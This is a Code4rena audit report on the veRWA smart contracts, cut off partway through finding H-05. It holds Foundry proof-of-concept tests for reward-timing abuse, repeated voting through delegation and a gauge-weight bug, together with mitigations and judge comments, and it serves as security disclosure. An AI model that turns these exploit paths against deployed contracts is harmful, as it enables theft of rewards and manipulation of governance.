---
sponsor: "Canto"
slug: "2023-08-verwa"
date: "2023-10-11"
title: "veRWA"
findings: "https://github.com/code-423n4/2023-08-verwa-findings/issues"
contest: 274
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the veRWA  smart contract system written in . The audit took place between August 7—August 10 2023.

## Wardens

134 Wardens contributed reports to the veRWA :

  1. [ladboy233](https://code4rena.com/@ladboy233)
  2. [bart1e](https://code4rena.com/@bart1e)
  3. [deadrxsezzz](https://code4rena.com/@deadrxsezzz)
  4. [0xDetermination](https://code4rena.com/@0xDetermination)
  5. [gzeon](https://code4rena.com/@gzeon)
  6. [Franfran](https://code4rena.com/@Franfran)
  7. [Yanchuan](https://code4rena.com/@Yanchuan)
  8. [catellatech](https://code4rena.com/@catellatech)
  9. [0xComfyCat](https://code4rena.com/@0xComfyCat)
  10. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  11. RED-LOTUS-REACH ([BlockChomper](https://code4rena.com/@BlockChomper), [DedOhWale](https://code4rena.com/@DedOhWale), [SaharDevep](https://code4rena.com/@SaharDevep), [reentrant](https://code4rena.com/@reentrant), and [escrow](https://code4rena.com/@escrow))
  12. [rjs](https://code4rena.com/@rjs)
  13. [popular00](https://code4rena.com/@popular00)
  14. [cducrest](https://code4rena.com/@cducrest)
  15. [mert\_eren](https://code4rena.com/@mert_eren)
  16. [immeas](https://code4rena.com/@immeas)
  17. [oakcobalt](https://code4rena.com/@oakcobalt)
  18. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  19. [bin2chen](https://code4rena.com/@bin2chen)
  20. [Brenzee](https://code4rena.com/@Brenzee)
  21. [nonseodion](https://code4rena.com/@nonseodion)
  22. Team_Rocket ([AlexCzm](https://code4rena.com/@AlexCzm), and [EllipticPoint](https://code4rena.com/@EllipticPoint))
  23. [ltyu](https://code4rena.com/@ltyu)
  24. [thekmj](https://code4rena.com/@thekmj)
  25. [0xCiphky](https://code4rena.com/@0xCiphky)
  26. GREY-HAWK-REACH ([Kose](https://code4rena.com/@Kose), [aswinraj94](https://code4rena.com/@aswinraj94), [dimulski](https://code4rena.com/@dimulski), [aslanbek](https://code4rena.com/@aslanbek), and [0xraion](https://code4rena.com/@0xraion))
  27. [pep7siup](https://code4rena.com/@pep7siup)
  28. [0xbrett8571](https://code4rena.com/@0xbrett8571)
  29. [kaden](https://code4rena.com/@kaden)
  30. [auditsea](https://code4rena.com/@auditsea)
  31. [markus\_ether](https://code4rena.com/@markus_ether)
  32. [Eeyore](https://code4rena.com/@Eeyore)
  33. [0x73696d616f](https://code4rena.com/@0x73696d616f)
  34. [ppetrov](https://code4rena.com/@ppetrov)
  35. [QiuhaoLi](https://code4rena.com/@QiuhaoLi)
  36. [3docSec](https://code4rena.com/@3docSec)
  37. [0xDING99YA](https://code4rena.com/@0xDING99YA)
  38. [lsaudit](https://code4rena.com/@lsaudit)
  39. [Jorgect](https://code4rena.com/@Jorgect)
  40. [Tripathi](https://code4rena.com/@Tripathi)
  41. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  42. [zhaojie](https://code4rena.com/@zhaojie)
  43. [qpzm](https://code4rena.com/@qpzm)
  44. [carrotsmuggler](https://code4rena.com/@carrotsmuggler)
  45. [nemveer](https://code4rena.com/@nemveer)
  46. [ADM](https://code4rena.com/@ADM)
  47. [Yuki](https://code4rena.com/@Yuki)
  48. [Tendency](https://code4rena.com/@Tendency)
  49. [Tricko](https://code4rena.com/@Tricko)
  50. [th13vn](https://code4rena.com/@th13vn)
  51. [BenRai](https://code4rena.com/@BenRai)
  52. [KmanOfficial](https://code4rena.com/@KmanOfficial)
  53. [Watermelon](https://code4rena.com/@Watermelon)
  54. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  55. [seerether](https://code4rena.com/@seerether)
  56. [Topmark](https://code4rena.com/@Topmark)
  57. [RandomUser](https://code4rena.com/@RandomUser)
  58. [Kow](https://code4rena.com/@Kow)
  59. [aakansha](https://code4rena.com/@aakansha)
  60. [Raihan](https://code4rena.com/@Raihan)
  61. [0xkazim](https://code4rena.com/@0xkazim)
  62. [d23e](https://code4rena.com/@d23e)
  63. [ni8mare](https://code4rena.com/@ni8mare)
  64. [jat](https://code4rena.com/@jat)
  65. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  66. [Shubham](https://code4rena.com/@Shubham)
  67. [klau5](https://code4rena.com/@klau5)
  68. [AlexCzm](https://code4rena.com/@AlexCzm)
  69. [sandy](https://code4rena.com/@sandy)
  70. [14si2o\_Flint](https://code4rena.com/@14si2o_Flint)
  71. [merlin](https://code4rena.com/@merlin)
  72. [Deekshith99](https://code4rena.com/@Deekshith99)
  73. [windhustler](https://code4rena.com/@windhustler)
  74. [owadez](https://code4rena.com/@owadez)
  75. [supervrijdag](https://code4rena.com/@supervrijdag)
  76. [carlos\_\_alegre](https://code4rena.com/@carlos__alegre)
  77. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  78. [kutugu](https://code4rena.com/@kutugu)
  79. [0x3b](https://code4rena.com/@0x3b)
  80. [MatricksDeCoder](https://code4rena.com/@MatricksDeCoder)
  81. [castle_chain](https://code4rena.com/@castle_chain)
  82. [Bughunter101](https://code4rena.com/@Bughunter101)
  83. [Rolezn](https://code4rena.com/@Rolezn)
  84. [ayden](https://code4rena.com/@ayden)
  85. [0x4non](https://code4rena.com/@0x4non)
  86. [audityourcontracts](https://code4rena.com/@audityourcontracts)
  87. [Alhakista](https://code4rena.com/@Alhakista)
  88. [imkapadia](https://code4rena.com/@imkapadia)
  89. [InAllHonesty](https://code4rena.com/@InAllHonesty)
  90. [leasowillow](https://code4rena.com/@leasowillow)
  91. [Strausses](https://code4rena.com/@Strausses)
  92. [HChang26](https://code4rena.com/@HChang26)
  93. [\_eperezok](https://code4rena.com/@_eperezok)
  94. [erebus](https://code4rena.com/@erebus)
  95. [deth](https://code4rena.com/@deth)
  96. [T1MOH](https://code4rena.com/@T1MOH)
  97. [RHaO-sec](https://code4rena.com/@RHaO-sec)
  98. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  99. [JP\_Courses](https://code4rena.com/@JP_Courses)
  100. [Naubit](https://code4rena.com/@Naubit)
  101. [tay054](https://code4rena.com/@tay054)
  102. [wahedtalash77](https://code4rena.com/@wahedtalash77)
  103. [halden](https://code4rena.com/@halden)
  104. [Mike\_Bello90](https://code4rena.com/@Mike_Bello90)
  105. [sl1](https://code4rena.com/@sl1)
  106. [0xStalin](https://code4rena.com/@0xStalin)
  107. [devival](https://code4rena.com/@devival)
  108. [Bube](https://code4rena.com/@Bube)
  109. [p\_crypt0](https://code4rena.com/@p_crypt0)
  110. [0xG0P1](https://code4rena.com/@0xG0P1)
  111. [0xmuxyz](https://code4rena.com/@0xmuxyz)
  112. [ch0bu](https://code4rena.com/@ch0bu)
  113. [SUPERMAN_I4G](https://code4rena.com/@SUPERMAN_I4G)
  114. [matrix\_0wl](https://code4rena.com/@matrix_0wl)
  115. [Giorgio](https://code4rena.com/@Giorgio)
  116. [0xE1](https://code4rena.com/@0xE1)
  117. [hassan-truscova](https://code4rena.com/@hassan-truscova)
  118. [0xweb3boy](https://code4rena.com/@0xweb3boy)
  119. [fatherOfBlocks](https://code4rena.com/@fatherOfBlocks)
  120. [Silverskrrrt](https://code4rena.com/@Silverskrrrt)
  121. [0xWaitress](https://code4rena.com/@0xWaitress)
  122. [koxuan](https://code4rena.com/@koxuan)
  123. [piyushshukla](https://code4rena.com/@piyushshukla)
  124. [pipidu83](https://code4rena.com/@pipidu83)
  125. [hpsb](https://code4rena.com/@hpsb)

This audit was judged by [alcueca](https://code4rena.com/@alcueca).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 11 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 3 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 96 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 veRWA  repository](https://github.com/code-423n4/2023-08-verwa), and is composed of 3 smart contracts written in the Solidity programming language and includes 749 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (8)
## [[H-01] User doesn't have to deposit for a week into the market to get their weekly reward from the `LendingLedger`](https://github.com/code-423n4/2023-08-verwa-findings/issues/416)
*Submitted by [SpicyMeatball](https://github.com/code-423n4/2023-08-verwa-findings/issues/416), also found by [mert\_eren](https://github.com/code-423n4/2023-08-verwa-findings/issues/435), [nonseodion](https://github.com/code-423n4/2023-08-verwa-findings/issues/399), [cducrest](https://github.com/code-423n4/2023-08-verwa-findings/issues/307), [immeas](https://github.com/code-423n4/2023-08-verwa-findings/issues/277), [popular00](https://github.com/code-423n4/2023-08-verwa-findings/issues/156), [0xComfyCat](https://github.com/code-423n4/2023-08-verwa-findings/issues/88), [GREY-HAWK-REACH](https://github.com/code-423n4/2023-08-verwa-findings/issues/73), [Yanchuan](https://github.com/code-423n4/2023-08-verwa-findings/issues/71), [ppetrov](https://github.com/code-423n4/2023-08-verwa-findings/issues/463), [kaden](https://github.com/code-423n4/2023-08-verwa-findings/issues/395), and [pep7siup](https://github.com/code-423n4/2023-08-verwa-findings/issues/104)*


In the `LendingLedger` contract, a user is rewarded with CANTO tokens depending on how long he has his deposit in the market. Rewards are distributed for each week during which the deposit was inside the market. However, the user can cheat this condition because we are rounding down to the start of the week, so the user can deposit at 23:59 at the end of the week and withdraw at 00:00 and still get rewarded as if he had his deposit for the whole week.

### Proof of Concept

<details>

Test case for the `LendingLedger.t.sol`

        function setupStateBeforeClaim() internal {
            whiteListMarket();

            vm.prank(goverance);
            ledger.setRewards(0, WEEK*10, amountPerEpoch);

            // deposit into market at 23:59 (week 4)
            vm.warp((WEEK * 5) - 1);

            int256 delta = 1.1 ether;
            vm.prank(lendingMarket);
            ledger.sync_ledger(lender, delta);

            // airdrop ledger enough token balance for user to claim
            payable(ledger).transfer(1000 ether);
            // withdraw at 00:00 (week 5)
            vm.warp(block.timestamp + 1);
            vm.prank(lendingMarket);
            ledger.sync_ledger(lender, delta * (-1));
        }

        function testClaimValidLenderOneEpoch() public {
            setupStateBeforeClaim();

            uint256 balanceBefore = address(lender).balance;
            vm.prank(lender);
            ledger.claim(lendingMarket, 0, type(uint256).max);
            uint256 balanceAfter = address(lender).balance;
            assertTrue(balanceAfter - balanceBefore == 1 ether);

            uint256 claimedEpoch = ledger.userClaimedEpoch(lendingMarket, lender);
            assertTrue(claimedEpoch - WEEK*4 == WEEK);
        }

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

It's difficult to propose a solution for this exploit without major changes in the contract's architecture. Perhaps we can somehow split the amount based on the time the sync was made inside the week, let's say Alice's `last_sync` was in the middle of week0, she deposited 1 ether, thus her amount for the current epoch will be 1/2 ether. However there is a caveat, how do we fill the gaps? We can't fill them with 1/2 ether. We can use this struct though,

    Amount {
        uint256 actualAmount,
        uint256 fraction
    }

so we can use `fraction` for the current epoch and `actualAmount = 1 ether` to fill the gaps.

**[alcueca (Judge) increased severity to High and commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/416#issuecomment-1693188476):**
 > Chosen as best due to clarity, conciseness, and presence of executable PoC

 > The rationale behind the High severity is that the purpose of veRWA is to attract liquidity to certain contracts as voted by CANTO holders, and this vulnerability defeats the purpose of attracting liquidity completely.

**[OpenCoreCH (veRWA) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/416#issuecomment-1702661143):**
> Reward calculation is now based on a time-weighted balance. Btw, while implementing the fix I noticed that the PoC here does not really highlight the problem. In the PoC, there is only one lender, so even if we take the deposit time into account, this lender should receive 100% of the epoch rewards (as they provided 100% of the liquidity within the market during this epoch). I modified the PoC to a scenario where there are two lenders, with one that deposited only for one second and one for the whole week. The one that deposited for the whole week should receive ~604800 times more rewards for this epoch, which is now the case:

<details>

> ```solidity
>     function testTimeWeightedClaiming() public {
>         whiteListMarket();
>         int256 delta = 1.1 ether;
> 
>         vm.prank(goverance);
>         ledger.setRewards(0, WEEK*10, amountPerEpoch);
>         vm.startPrank(lendingMarket);
>         // users[2] deposits at beginning of epoch
>         vm.warp(WEEK * 4);
>         ledger.sync_ledger(users[2], delta);
>         // lender deposits at 23:59 (week 4)
>         vm.warp((WEEK * 5) - 1);
> 
>         ledger.sync_ledger(lender, delta);
>         vm.stopPrank();
> 
>         // airdrop ledger enough token balance for user to claim
>         payable(ledger).transfer(1000 ether);
>         // withdraw at 00:00 (week 5)
>         vm.warp(WEEK * 5);
>         vm.prank(lendingMarket);
>         ledger.sync_ledger(lender, delta * (-1));
> 
>         uint256 balanceBefore = address(lender).balance;
>         vm.prank(lender);
>         ledger.claim(lendingMarket, 0, type(uint256).max);
>         uint256 balanceAfter = address(lender).balance;
>         // Lender should receive rewards for 1 second
>         assertEq(balanceAfter - balanceBefore, 1 * 1 ether * 1.1 ether / (1.1 ether * WEEK + 1.1 ether));
>         uint256 balanceBefore2 = address(users[2]).balance;
>         vm.prank(users[2]);
>         ledger.claim(lendingMarket, 0, type(uint256).max);
>         uint256 balanceAfter2 = address(users[2]).balance;
>         // User2 should receive rewards for 1 week
>         assertEq(balanceAfter2 - balanceBefore2, WEEK * 1 ether * 1.1 ether / (1.1 ether * WEEK + 1.1 ether));
>     }
> ```

</details><br>

**[OpenCoreCH (veRWA) confirmed on duplicate finding #71](https://github.com/code-423n4/2023-08-verwa-findings/issues/71)**

***

## [[H-02] Voters from VotingEscrow can vote infinite times in vote_for_gauge_weights() of GaugeController](https://github.com/code-423n4/2023-08-verwa-findings/issues/396)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-08-verwa-findings/issues/396), also found by [mert\_eren](https://github.com/code-423n4/2023-08-verwa-findings/issues/419), [oakcobalt](https://github.com/code-423n4/2023-08-verwa-findings/issues/393), [SpicyMeatball](https://github.com/code-423n4/2023-08-verwa-findings/issues/368), [Tricko](https://github.com/code-423n4/2023-08-verwa-findings/issues/365), [0xComfyCat](https://github.com/code-423n4/2023-08-verwa-findings/issues/321), [QiuhaoLi](https://github.com/code-423n4/2023-08-verwa-findings/issues/319), [Team\_Rocket](https://github.com/code-423n4/2023-08-verwa-findings/issues/302), [Yanchuan](https://github.com/code-423n4/2023-08-verwa-findings/issues/297), [immeas](https://github.com/code-423n4/2023-08-verwa-findings/issues/280), [GREY-HAWK-REACH](https://github.com/code-423n4/2023-08-verwa-findings/issues/266), [th13vn](https://github.com/code-423n4/2023-08-verwa-findings/issues/237), 0xCiphky ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/177), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/173)), [ltyu](https://github.com/code-423n4/2023-08-verwa-findings/issues/114), [deadrxsezzz](https://github.com/code-423n4/2023-08-verwa-findings/issues/86), [nonseodion](https://github.com/code-423n4/2023-08-verwa-findings/issues/459), [lanrebayode77](https://github.com/code-423n4/2023-08-verwa-findings/issues/443), [0xDetermination](https://github.com/code-423n4/2023-08-verwa-findings/issues/421), [popular00](https://github.com/code-423n4/2023-08-verwa-findings/issues/410), and [kaden](https://github.com/code-423n4/2023-08-verwa-findings/issues/387)*

<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L211> <br><https://github.com/code-423n4/2023-08-verwa/blob/main/src/VotingEscrow.sol#L356>

Delegate mechanism in `VotingEscrow` allows infinite votes in `vote_for_gauge_weights()` in the `GaugeController`. Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.

### Proof of Concept

`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user.
The `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.

Due to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.

A POC was built in Foundry, add the following test to `GaugeController.t.sol`:

<details>

```solidity
function testDelegateSystemMultipleVoting() public {
    vm.deal(user1, 100 ether);
    vm.startPrank(gov);
    gc.add_gauge(user1);
    gc.change_gauge_weight(user1, 100);
    vm.stopPrank();

    vm.deal(user2, 100 ether);
    vm.startPrank(gov);
    gc.add_gauge(user2);
    gc.change_gauge_weight(user2, 100);
    vm.stopPrank();

    uint256 v = 10 ether;

    vm.startPrank(user1);
    ve.createLock{value: v}(v);
    gc.vote_for_gauge_weights(user1, 10_000);
    vm.stopPrank();

    vm.startPrank(user2);
    ve.createLock{value: v}(v);
    gc.vote_for_gauge_weights(user2, 10_000);
    vm.stopPrank();

    uint256 expectedWeight_ = gc.get_gauge_weight(user1);

    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);

    uint256 numDelegatedTimes_ = 20;

    for (uint i_; i_ < numDelegatedTimes_; i_++) {
        address fakeUserI_ = vm.addr(i_ + 27); // random num
        vm.deal(fakeUserI_, 1);

        vm.prank(fakeUserI_);
        ve.createLock{value: 1}(1);

        vm.prank(user1);
        ve.delegate(fakeUserI_);

        vm.prank(fakeUserI_);
        gc.vote_for_gauge_weights(user1, 10_000);
    }

    // assert that the weight is approx numDelegatedTimes_ more than expected
    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);

    // relative weight has been increase by a lot, can be increased even more if wished
    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);
}
```

</details>


### Tools Used

Vscode, Foundry

### Recommended Mitigation Steps

The vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past.

Additionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/396#issuecomment-1693179514):**
 > Chosen as best due to the clear and concise explanation, including business impact on the protocol, and including an executable PoC.

 **[OpenCoreCH (veRWA) confirmed on duplicate finding 86](https://github.com/code-423n4/2023-08-verwa-findings/issues/86)**

***

## [[H-03] When adding a gauge, its initial value has to be set by an admin or all voting power towards it will be lost](https://github.com/code-423n4/2023-08-verwa-findings/issues/288)
*Submitted by [deadrxsezzz](https://github.com/code-423n4/2023-08-verwa-findings/issues/288), also found by [oakcobalt](https://github.com/code-423n4/2023-08-verwa-findings/issues/442), [0xComfyCat](https://github.com/code-423n4/2023-08-verwa-findings/issues/398), [Yanchuan](https://github.com/code-423n4/2023-08-verwa-findings/issues/331), [Brenzee](https://github.com/code-423n4/2023-08-verwa-findings/issues/287), [bin2chen](https://github.com/code-423n4/2023-08-verwa-findings/issues/169), [auditsea](https://github.com/code-423n4/2023-08-verwa-findings/issues/401), [cducrest](https://github.com/code-423n4/2023-08-verwa-findings/issues/390), [markus\_ether](https://github.com/code-423n4/2023-08-verwa-findings/issues/306), and [Team\_Rocket](https://github.com/code-423n4/2023-08-verwa-findings/issues/262)*

<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L118> 

<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L204>

Voting power towards gauges will be lost and project will not work properly

### Proof of Concept

The mapping `time_weight` takes a gauge as a param and returns the most recent timestamp a gauge has had its weight recorded/ updated. There are 2 ways to set this value: through `_get_weight` and `_change_gauge_weight`.

<details>

```solidity
function _get_weight(address _gauge_addr) private returns (uint256) {
        uint256 t = time_weight[_gauge_addr];
        if (t > 0) {
            Point memory pt = points_weight[_gauge_addr][t];
            for (uint256 i; i < 500; ++i) {
                if (t > block.timestamp) break;
                t += WEEK;
                uint256 d_bias = pt.slope * WEEK;
                if (pt.bias > d_bias) {
                    pt.bias -= d_bias;
                    uint256 d_slope = changes_weight[_gauge_addr][t];
                    pt.slope -= d_slope;
                } else {
                    pt.bias = 0;
                    pt.slope = 0;
                }
                points_weight[_gauge_addr][t] = pt;
                if (t > block.timestamp) time_weight[_gauge_addr] = t;
            }
            return pt.bias;
        } else {
            return 0;
        }
    }
```

The problem in `_get_weight` is that the initial value of any `time_weight[_gauge_addr]` will be 0. It will go through the entirety of the loop and `t` will increase +1 week for every iteration. The problem is that even after 500 iterations `t` will be `< block.timestamp` so the value of `time_weight[_gauge_addr]` will remain 0. Unless admins call manually `_change_gauge_weight` to set an initial value, `time_weight[_gauge_addr]` will remain 0. Any  time a user will use `_get_weight` to fill with recent data, the function will iterate over old values and will do nothing. Recent values won't be set and anything depending on it will receive 0 as a recent value.

```solidity
    function _change_gauge_weight(address _gauge, uint256 _weight) internal {
        uint256 old_gauge_weight = _get_weight(_gauge);
        uint256 old_sum = _get_sum();
        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;

        points_weight[_gauge][next_time].bias = _weight;
        time_weight[_gauge] = next_time;

        uint256 new_sum = old_sum + _weight - old_gauge_weight;
        points_sum[next_time].bias = new_sum;
        time_sum = next_time;
    }
```

Since `_change_gauge_weight` is not called within `add_gauge`, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again.
Here are 3 written test-cases which prove the statements above:

```solidity
   function testWithoutManualSet() public {
        vm.startPrank(gov);
        gc.add_gauge(gauge1);
        vm.stopPrank();

        vm.startPrank(user1);
        ve.createLock{value: 1 ether}(1 ether);
        gc.vote_for_gauge_weights(gauge1, 10000);
        uint weight = gc.get_gauge_weight(gauge1);
        console.log("gauge's weight after voting: ", weight);
        vm.stopPrank();
    }

    function testWithManualSet() public { 
        vm.startPrank(gov);
        gc.add_gauge(gauge1);
        gc.change_gauge_weight(gauge1, 0);
        vm.stopPrank();

        vm.startPrank(user1);
        ve.createLock{value: 1 ether}(1 ether);
        gc.vote_for_gauge_weights(gauge1, 10000);
        uint weight = gc.get_gauge_weight(gauge1);
        console.log("gauge's weight after voting: ", weight);
        vm.stopPrank();
    }

    function testWithChangeMidway() public {
        vm.startPrank(gov);
        gc.add_gauge(gauge1);
        vm.stopPrank();

        vm.startPrank(user1);
        ve.createLock{value: 1 ether}(1 ether);
        gc.vote_for_gauge_weights(gauge1, 10000);
        uint weight = gc.get_gauge_weight(gauge1);
        console.log("gauge's weight after voting: ", weight);
        vm.stopPrank();

        vm.prank(gov);
        gc.change_gauge_weight(gauge1, 0);

        vm.startPrank(user1);
        gc.vote_for_gauge_weights(gauge1, 10000);
        weight = gc.get_gauge_weight(gauge1);
        console.log("gauge's weight after voting after admin set", weight);

        gc.vote_for_gauge_weights(gauge1, 0);
        gc.vote_for_gauge_weights(gauge1, 10000);
        weight = gc.get_gauge_weight(gauge1);
        console.log("gauge's weight after voting after admin set after vote reset", weight);
        
    }
```

and the respective results:

    [PASS] testWithoutManualSet() (gas: 645984)
    Logs:
      gauge's weight after voting:  0

```

    [PASS] testWithManualSet() (gas: 667994)
    Logs:
      gauge's weight after voting:  993424657416307200
```

```

    [PASS] testWithChangeMidway() (gas: 744022)
    Logs:
      gauge's weight after voting:  0
      gauge's weight after voting after admin set 0
      gauge's weight after voting after admin set after vote reset 993424657416307200
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Upon adding a gauge, make a call to `change_gauge_weight` and set its initial weight to 0.

**[\_\_141345\_\_ (Lookout) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/288#issuecomment-1678351795):**
 > Forget to initialize `time_weight[]` when add new gauge.

***

## [[H-04] Delegated votes are locked when owner lock is expired](https://github.com/code-423n4/2023-08-verwa-findings/issues/268)
*Submitted by [ltyu](https://github.com/code-423n4/2023-08-verwa-findings/issues/268), also found by [qpzm](https://github.com/code-423n4/2023-08-verwa-findings/issues/248), [RED-LOTUS-REACH](https://github.com/code-423n4/2023-08-verwa-findings/issues/231), [bart1e](https://github.com/code-423n4/2023-08-verwa-findings/issues/226), [0xDING99YA](https://github.com/code-423n4/2023-08-verwa-findings/issues/171), [zhaojie](https://github.com/code-423n4/2023-08-verwa-findings/issues/158), [popular00](https://github.com/code-423n4/2023-08-verwa-findings/issues/151), [MrPotatoMagic](https://github.com/code-423n4/2023-08-verwa-findings/issues/118), [carrotsmuggler](https://github.com/code-423n4/2023-08-verwa-findings/issues/112), [pep7siup](https://github.com/code-423n4/2023-08-verwa-findings/issues/79), [3docSec](https://github.com/code-423n4/2023-08-verwa-findings/issues/30), [mert\_eren](https://github.com/code-423n4/2023-08-verwa-findings/issues/403), [kaden](https://github.com/code-423n4/2023-08-verwa-findings/issues/373), [Yuki](https://github.com/code-423n4/2023-08-verwa-findings/issues/352), [seerether](https://github.com/code-423n4/2023-08-verwa-findings/issues/275), [KmanOfficial](https://github.com/code-423n4/2023-08-verwa-findings/issues/238), cducrest ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/236), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/227)), [Tendency](https://github.com/code-423n4/2023-08-verwa-findings/issues/211), and [bin2chen](https://github.com/code-423n4/2023-08-verwa-findings/issues/170)*

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L331> 

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L371-L374>

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L383>

In `delegate()` of VoteEscrow\.sol, a user is able to delegate their locked votes to someone else, and undelegate (i.e. delegate back to themselves). When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.

### Proof of Concept

To exit the system, Alice must call `withdraw()`. However, since they've delegated, they will not be able to.

<details>

```solidity
function withdraw() external nonReentrant {
	...
	require(locked_.delegatee == msg.sender, "Lock delegated");
	...
}
```

To re-delegate to themselves (undelegate), they call `delegate(alice.address)`. However, there is a check to see if `toLocked.end` has expired, which would be true since it would point to Alice's lock.

    function delegate(address _addr) external nonReentrant {
    	LockedBalance memory locked_ = locked[msg.sender];
    	...
    	LockedBalance memory fromLocked;
    	LockedBalance memory toLocked;
    	locked_.delegatee = _addr;
    	if (delegatee == msg.sender) {
    		...
    	// @audit this else if will execute
    	} else if (_addr == msg.sender) {
    		// Undelegate
    		fromLocked = locked[delegatee]; // @audit Delegatee
    		toLocked = locked_; // @audit Alice's lock
    	}
    	...
    	require(toLocked.end > block.timestamp, "Delegatee lock expired");

This is a test to be added into VoteEscrow\.t.sol. It can be manually run by executing `forge test --match-test testUnSuccessUnDelegate`.

```solidity
function testUnSuccessUnDelegate() public {
	testSuccessDelegate();
	vm.warp(ve.LOCKTIME() + 1 days);

	// Try to undelegate
	vm.startPrank(user1);
	vm.expectRevert("Delegatee lock expired");
	ve.delegate(user1);

	// Still user2
	(, , , address delegatee) = ve.locked(user1);
	assertEq(delegatee, user2);
}
```
</details>

### Recommended Mitigation Steps

Consider refactoring the code to skip `toLocked.end > block.timestamp` if undelegating. For example, adding a small delay (e.g., 1 second) to the lock end time when a user undelegates.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/268#issuecomment-1694504863):**
 > This vulnerability, if not found, would have meant that some users would have permanently lost assets in the form of voting power. While at that point the application owners would certainly warn users to not let their locks expire without undelegating, many users would not get the warning, as it is not that easy to make sure that every user is aware of something. The result is that time and again, users would get their tokens locked forever.

**[OpenCoreCH (veRWA) confirmed on duplicate 112](https://github.com/code-423n4/2023-08-verwa-findings/issues/112)**


***

## [[H-05] It is possible to DoS all the functions related to some gauge in `GaugeController`](https://github.com/code-423n4/2023-08-verwa-findings/issues/206)
*Submitted by [bart1e](https://github.com/code-423n4/2023-08-verwa-findings/issues/206), also found by [0xDetermination](https://github.com/code-423n4/2023-08-verwa-findings/issues/386)*

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L91-L114> 

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L142> 

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L180> 

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L189> 

<https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L247>

`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:

```solidity
            for (uint256 i; i < 500; ++i) {
                if (t > block.timestamp) break;
                t += WEEK;
                uint256 d_bias = pt.slope * WEEK;
                if (pt.bias > d_bias) {
                    pt.bias -= d_bias;
                    uint256 d_slope = changes_weight[_gauge_addr][t];
